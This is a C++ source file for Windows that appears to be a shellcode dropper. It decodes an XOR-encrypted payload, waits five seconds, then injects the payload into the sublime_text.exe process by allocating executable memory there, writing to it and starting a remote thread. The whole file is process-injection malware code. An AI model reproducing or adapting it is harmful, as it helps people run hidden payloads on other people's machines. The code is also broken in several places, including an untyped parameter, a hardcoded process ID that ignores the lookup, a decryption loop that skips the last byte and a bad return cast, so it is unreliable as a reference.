#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <memoryapi.h>

#include <string>
#include <cstdint>
#include <iostream>
#include "resource.h"
#include "dropper.h"

using namespace std;
unsigned char XorCipher(u_char data[], int datalen, u_char key[], int keylen) { 
	cout << "[+] XorCipher checkpoint" << "\n";

	int charlen = sizeof(char);
	for (int i = 0; i < datalen - 1; i++) {
		data[i] = data[i] ^ key[i % keylen / charlen];
	}
	cout << "[*] Payload parsed" << "/n";
	return (u_char) data;
}
DWORD GetProcessId( processName) {
	cout << "[+] GetProcessId checkpoint" << "\n";
	
	PROCESSENTRY32 processEntryList;
	processEntryList.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	cout << "[+] Process snapshot created" << "\n";
	
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		cout << "[!] Error retreiving process snapshot" << "\n";
		return 0;
	}
	Process32First(hSnapshot, &processEntryList);
	if (!processName.compare(processEntryList.szExeFile)) {
		cout << "[!] Error parsing entry list" << "\n";
		CloseHandle(hSnapshot);
		return processEntryList.th32ProcessID;
	}
	while (Process32Next(hSnapshot, &processEntryList)) {
		if (!processName.compare(processEntryList.szExeFile)) {
			CloseHandle(hSnapshot);
			return processEntryList.th32ProcessID;
		}
	}
	CloseHandle(hSnapshot);
	return 0;
}
int main() {

	typedef LPVOID(WINAPI* VirtualAllocEx_t)(
		HANDLE hProcess,
		LPVOID lpAddress,
		SIZE_T dwSize,
		DWORD flAllocationType,
		DWORD flProtect
	);
	typedef BOOL(WINAPI* WriteProcessMemory_t)(
		HANDLE hProcess,
		LPVOID lpBaseAddress,
		LPCVOID lpBuffer,
		SIZE_T nSize,
		SIZE_T* lpNumberOfBytesWritten
	);
	typedef HANDLE(WINAPI* CreateRemoteThread_t)(
		HANDLE hProcess,
		LPSECURITY_ATTRIBUTES lpThreadAttributes,
		SIZE_T dwStackSize,
		LPTHREAD_START_ROUTINE lpStartAddress,
		LPVOID lpParameter,
		DWORD dwCreationFlags,
		LPDWORD lpThreadId
	);

	cout << "[+] Main checkpoint" << "\n";
	cout << "[*] Delay execution" << "\n";
	Sleep(5000);

	string processName = "sublime_text.exe";
	GetProcessId(processName);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, 17924);

	cout << "[+] Process handle created" << "\n";

	LPVOID pRemoteShellcode = NULL;
	pRemoteShellcode = VirtualAllocEx(hProcess, NULL, payloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	cout << "[+] Virtual memory allocated. Base address and other information set" << "\n";

	UCHAR bPayload;
	bPayload = XorCipher(payload, payloadLen, key, keylen);
	WriteProcessMemory(hProcess, pRemoteShellcode, (LPCVOID)payload, payloadLen, NULL);

	cout << "[*] Process memory written. Waiting for execution" << "\n";
	
	HANDLE hThread;
	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteShellcode, NULL, 0, NULL);
	cout << "[+] Thread to remote process created" << "\n";

	CloseHandle(hProcess);
	cout << "[*] Done." << "\n";

	return 0;
}
